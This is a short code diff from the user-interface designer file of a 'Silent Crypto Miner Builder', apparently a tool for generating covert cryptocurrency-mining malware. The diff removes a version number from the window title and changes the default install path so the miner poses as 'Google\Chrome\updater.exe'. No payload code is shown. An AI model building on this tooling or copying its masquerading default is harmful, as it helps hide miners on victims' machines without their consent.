@@ -151,7 +151,7 @@ namespace SilentCryptoMiner
             this.formBuilder.Size = new System.Drawing.Size(535, 272);
             this.formBuilder.SubHeader = "By Unam Sanctam";
             this.formBuilder.TabIndex = 0;
-            this.formBuilder.Text = "Silent Crypto Miner Builder 2.3.1";
+            this.formBuilder.Text = "Silent Crypto Miner Builder";
             // 
             // tabcontrolBuilder
             // 
@@ -390,7 +390,7 @@ namespace SilentCryptoMiner
             this.txtInstallFileName.Name = "txtInstallFileName";
             this.txtInstallFileName.Size = new System.Drawing.Size(139, 24);
             this.txtInstallFileName.TabIndex = 48;
-            this.txtInstallFileName.Text = "Chrome\\updater.exe";
+            this.txtInstallFileName.Text = "Google\\Chrome\\updater.exe";
             this.txtInstallFileName.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
             this.txtInstallFileName.UseSystemPasswordChar = false;
             this.txtInstallFileName.WordWrap = false;
